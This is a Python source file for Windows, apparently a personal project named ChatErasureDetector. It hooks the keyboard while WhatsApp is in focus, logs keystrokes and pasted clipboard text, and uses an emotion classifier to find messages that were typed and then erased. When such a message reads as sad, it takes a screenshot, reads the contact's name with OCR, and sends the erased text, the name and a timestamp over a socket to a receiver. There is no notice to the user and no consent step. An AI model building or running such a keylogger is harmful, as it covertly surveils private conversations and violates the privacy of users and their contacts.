"""
- Next Up:
- Integrate NLP model
- Handle conditions where text is not being sent successfully. Sockets doesnt raise error immediately when the receiver fails. Data is lost in such situation. so build acknowledgement mechanisms to ensure no data is lost
- also add save and read operations in both sender and receiver to ensure captured data is stored if the receiver is offline. also add a writer and reader to store all the received data locally to access them later
"""
import sys
sys.path.append('C:\\Users\\adars\\PycharmProjects\\pythonProject\\application\\venv\\Lib\\site-packages')
sys.path.append('C:\\Users\\adars\\PycharmProjects\\pythonProject\\discord bot\\venv\\Lib\\site-packages')


import win32gui
import time
import pytesseract
from PIL import ImageGrab
from ctypes import windll
import keyboard
import socket
import pyperclip
from transformers import pipeline

class Transmit:
    def __init__(self):
        self.connected = False
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        try:
            self.s.connect(('127.0.0.1', 9999))
            print('\nConnected to the server!')
            return True
        except (ConnectionRefusedError, ConnectionAbortedError, ConnectionResetError):
            return False

    def tryAgain(self):
        print('Establishing connection')
        time.sleep(1)
        while not self.connected:
            print("Retrying...")
            self.connected = self.connect()
            time.sleep(1)
    
    def send(self, texts):
        if texts and self.connected:
            try:
                self.s.sendall(texts.encode())
            except (ConnectionResetError, BrokenPipeError):
                print("Connection lost. Retrying...")
                self.connected = False
                self.tryAgain()

class NLP:
    def __init__(self):
        self.classifier = pipeline("text-classification", model="j-hartmann/emotion-english-distilroberta-base", return_all_scores=True)

    def emotionalContextDetector(self, text):
        if not text:
            return False
        
        results = self.classifier(text)[0]  # Get the list of emotions with scores
        emotions = {res['label'].lower(): res['score'] for res in results}
        
        # Check if top emotion is sad or depressed (you can customize this threshold logic)
        top_emotion = max(emotions, key=emotions.get)
        
        return top_emotion in ["sadness", "depression"]

class ChatErasureDetector:
    def __init__(self):
        self.user32 = windll.user32
        self.user32.SetProcessDPIAware()

        self.capturedKeys = ''
        self.backspaces = 0
        self.window = None
        self.started = False
        self.ctrl_a_pressed = False
        self.excluded_keys = {'shift', 'alt', 'space', 'enter', 'return', 'ctrl', 'backspace'}

        self.transmitter = Transmit()
        self.transmitter.tryAgain()

        self.engine = NLP()

        pytesseract.pytesseract.tesseract_cmd = r"C:\Users\adars\AppData\Local\Programs\Tesseract-OCR\tesseract.exe"

    def get_foreground_window_title(self):

        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return "WhatsApp" in title, window, title

    def getScreenShot(self, hwnd):
        left, top, right, _ = win32gui.GetWindowRect(hwnd)

        left1 = left + 451
        top1 = top + 50
        right1 = right + 11
        bottom1 = top1 + 111

        if right1 > left1 and top1 < bottom1:

            screenshot1 = ImageGrab.grab(bbox=[left1, top1, right1, bottom1])
            width, _ = screenshot1.size
            if width < 533:
                left1 -= 440
                screenshot1 = ImageGrab.grab(bbox=[left1, top1, right1, bottom1])

            return screenshot1

    def keylogger(self, event):
        
        if event.event_type == "down":  # Only capture key press events
            key = event.name

            if key in self.excluded_keys and not key.isprintable():
                return

            elif key == 'a' and keyboard.is_pressed('ctrl'):
                self.ctrl_a_pressed = True
                return
            
            elif key == 'v' and keyboard.is_pressed('ctrl'):
                pasted_text = pyperclip.paste()  # Get clipboard content
                if pasted_text:
                    self.capturedKeys += pasted_text
                return
            
            elif key == 'space':
                self.capturedKeys += " "
                return

            elif (keyboard.is_pressed('ctrl') or keyboard.is_pressed('shift') or keyboard.is_pressed('alt')) and key == "enter":
                self.capturedKeys += '\n'
                return

            elif key == 'enter':
                print('message was sent')
                self.capturedKeys = ''
                self.backspaces = 0
                return

            elif key == 'backspace':
                timeStamp = event.time
                self.backspaces += 1

                if self.backspaces >= (len(self.capturedKeys) * 75) / 100 or self.ctrl_a_pressed:
                    emotionalContext = self.engine.emotionalContextDetector(self.capturedKeys)

                    if emotionalContext:
                        image = self.getScreenShot(self.window)

                        if image:
                            username = pytesseract.image_to_string(image)

                        self.transmitter.send(
f'''
    To: {username}
    Text: {self.capturedKeys}
    Date/Time: {time.ctime(timeStamp)}
'''
                        )
                    self.backspaces = 0
                    self.capturedKeys = ''
                    self.ctrl_a_pressed = False
                    return
            
                return

            self.capturedKeys = self.capturedKeys[:-self.backspaces] if self.backspaces > 0 else self.capturedKeys
            self.backspaces = 0

            if key not in self.excluded_keys:
                self.capturedKeys += key

    def start(self):
        while True:
            whatsapp = self.get_foreground_window_title()

            if whatsapp[0]:               
                if not self.started:
                    self.window = whatsapp[1]
                    print("keylogger started")
                    print(whatsapp[2])
                    print(whatsapp[1])
                    keyboard.hook(self.keylogger)
                    self.started = True

            else:
                if self.started:
                    keyboard.unhook_all()
                    print('Keylogger Paused')
                    self.started = False


if __name__ == "__main__":
    app = ChatErasureDetector()
    app.start()

    

